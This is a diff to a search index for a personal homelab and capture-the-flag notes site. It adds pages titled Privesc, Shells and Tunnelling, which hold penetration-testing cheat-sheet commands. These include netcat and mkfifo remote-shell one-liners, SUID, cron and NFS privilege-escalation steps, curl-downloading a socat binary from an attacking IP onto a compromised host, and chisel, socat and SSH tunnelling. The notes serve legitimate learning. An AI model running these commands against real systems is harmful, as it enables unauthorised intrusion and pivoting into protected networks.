@@ -7,6 +7,13 @@
 	"content": "Networking Discover what this Hugo theme is all about and the core-concepts behind it.\n"
 },
 {
+	"uri": "/hacking/notes/",
+	"title": "Notes",
+	"tags": [],
+	"description": "",
+	"content": "Notes Privesc Shells Tunnelling "
+},
+{
 	"uri": "/servers/",
 	"title": "Servers",
 	"tags": [],
@@ -18,7 +25,7 @@
 	"title": "Hacking",
 	"tags": [],
 	"description": "",
-	"content": "Hacking Discover what this Hugo theme is all about and the core-concepts behind it.\n"
+	"content": "Hacking Notes on some tips and techniques I have picked up working on CTFs\n"
 },
 {
 	"uri": "/hardware/",
@@ -28,11 +35,18 @@
 	"content": "Hardware Discover what this Hugo theme is all about and the core-concepts behind it.\n"
 },
 {
+	"uri": "/hacking/tryhackme/",
+	"title": "TryHackMe",
+	"tags": [],
+	"description": "",
+	"content": "TryHackMe Walkthroughs "
+},
+{
 	"uri": "/",
 	"title": "About",
 	"tags": [],
 	"description": "",
-	"content": "SasquatchMitch\u0026rsquo;s Homelab Hi my name is Mitch and this is a site I set up to document the things I have learned setting up my homelab, going through CTFs and working on hardware level projects. It is mainly a place I can write down my thoughts and notes while I learn.\nFolders Networking homelab network documentation note on networking related certifications Servers documenting the setup and issues that come up with the servers in my homelab Hacking CTF writeups notes on some tips and techniques I have picked up Hardware learning about reverse engineering/hardware hacking learning about beginner electronics subjects "
+	"content": "Notes and Stuff Hi my name is Mitch and this is a site I set up to document the things I have learned setting up my homelab, going through CTFs and working on hardware level projects. It is mainly a place I can write down my thoughts and notes while I learn.\nNetworking homelab network documentation note on networking related certifications Servers documenting the setup and issues that come up with the servers in my homelab Hacking CTF writeups notes on some tips and techniques I have picked up Hardware learning about reverse engineering/hardware hacking learning about beginner electronics subjects "
 },
 {
 	"uri": "/categories/",
@@ -42,9 +56,37 @@
 	"content": ""
 },
 {
+	"uri": "/hacking/tryhackme/overpass/",
+	"title": "Overpass",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/hacking/notes/privesc/",
+	"title": "Privesc",
+	"tags": [],
+	"description": "",
+	"content": "SUDO\nuse \u0026ldquo;sudo -l\u0026rdquo; to see what the user can use sudo on and use gtfo bins SUID\nfind / -type f -perm -04000 -ls 2\u0026gt;/dev/null - finds suid files on machine use gtfo bins to abuse this Capabilities\nusing \u0026ldquo;getcap -r / 2\u0026gt;/dev/null\u0026rdquo; you can list binaries that can use higher privileges then use gtfo bins Cronjobs\nlook in the /etc/crontab file and look at what jobs are running if there is no full path you can create a script in one of the path locations create a rev shell script or exploit one of the binaries used in a script. make sure that the script is executable PATH\nuse \u0026ldquo;find / -writable 2\u0026gt;/dev/null\u0026rdquo; to find writable directories add to \u0026ldquo;PATH variable with export PATH=/:$PATH\u0026rdquo; NFS\nNFS config: /etc/exports look for the share that has no_root-squash this keeps it operating with root priveleges on attacking machine: showmount -e mount -o rw :/ / create an executable that will run /bin/bash on the target set SUID bits so it will run as root run script on target machine "
+},
+{
+	"uri": "/hacking/notes/shells/",
+	"title": "Shells",
+	"tags": [],
+	"description": "",
+	"content": "Netcat on compromised machine nc -lvnp PORT -e /bin/bash If previous doesn\u0026rsquo;t work use: mkfifo /tmp/f; nc -lvnp \u0026lt; /tmp/f | /bin/sh \u0026gt;/tmp/f 2\u0026gt;\u0026amp;1; rm /tmp/ Stabalize a reverse shell python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; export TERM=xterm Ctrl Z + stty raw -echo; fg "
+},
+{
 	"uri": "/tags/",
 	"title": "Tags",
 	"tags": [],
 	"description": "",
 	"content": ""
+},
+{
+	"uri": "/hacking/notes/tunnelling/",
+	"title": "Tunnelling",
+	"tags": [],
+	"description": "",
+	"content": "Chisel use webserver method to transfer files or use scp scp -i Key chisel user@target:/tmp/chisel has two modes server and client reverse SOCKS proxy\nset up listener on attaacking box ./chisel server -p listenPort \u0026ndash;reverse \u0026amp; on the compromised host ./chisel client attackingIP:listenPort R:socks \u0026amp; port for sending data back through the proxy will be different forward SOCKS proxy\non compromised host ./chisel server -p listenPort \u0026ndash;socks5 on attacking box ./chisel client targerIP:listenPort proxyPort:socks make sure to set the port in the proxychains config and change the start of the line form socks4 to socks5 as chisel uses socks5 remote port forward\non our attacking machine ./chisel server -p listenPort \u0026ndash;reverse \u0026amp; on the compromised host ./chisel client attackingIP:listenPort R:localPort:targetIP:targetPort \u0026amp; listenPort - port for the chisel server localPort - port we wish to open on the attacking machine to link with the desired target port local port forward\non compromised machine\n./chisel server -p listenPort on attacking machine\n./chisel client listenIP:listenPort localPort:targetIP:targetPort to destroy the connections use\njobs - list background jobs kill %number Socat Upload the Socat binary to the compromised box\nsudo python3 -m http.server 80 On target: curl attackingIP/socat -o /tmp/socat \u0026amp;\u0026amp; chmod +x /tmp/socat set up netcat on attacking machine Start a relay from compromised server to attacking machine: ./socat tcp-l:listeningPort tcp:attackingIP:Port \u0026amp; \u0026amp; to background the socat process Port Forwarding\n./socat tcp-l:listeningport,fork,reuseaddr tcp:targetIP:Port \u0026amp; fork - put every connection into a new process reuseaddr - the port stays open after a connection is made to it Stable Linux Reverse Shell\non listening machine: socat TCP-L: FILE:tty,raw,echo=0 on connecting machine: socat TCP:: EXEC:\u0026ldquo;bash -li\u0026rdquo;,pty,stderr,sigint,setsid,sane SSH Forward Connections\nPort Forwarding ssh -L LocalPort:TargetIP user@AccessedMachineIP -fN -f(backgrounds the shell)N(no need to execute any commands) access target machine through accessed machine Proxies ssh -D LocalPort user@TargetIP -fN useful when combined with proxychains opens port on attacking machine and sends traffic through into the protected network Reverse Connections Create ssh keys and make sure the key can only be used for port forwarding. ssh -R LocalPort:TargetIP:TargetPort Username@AttackingIP -i Keyfile -fN sshuttle installed with sudo apt install sshuttle on attacking machine to connect with a server sshuttle -r username@address subnet ex: sshuttle -r user@172.16.0.5 172.16.0.0/24 can use -N to try and automatically determine the subnet can also use \u0026amp; to background the commands when you dont have the password or it requires key-based auth \u0026ndash;ssh-cmd ex: sshuttle -r user@address \u0026ndash;ssh-cmd \u0026ldquo;ssh -i KEYFILE\u0026rdquo; subnet when the compromised server is in the same subnet you are trying to forward to use: -x - tells sshuttle toi exclude the compromised server from the subnet range ex: sshuttle -r user@address subnet -x excludedIP "
 }]
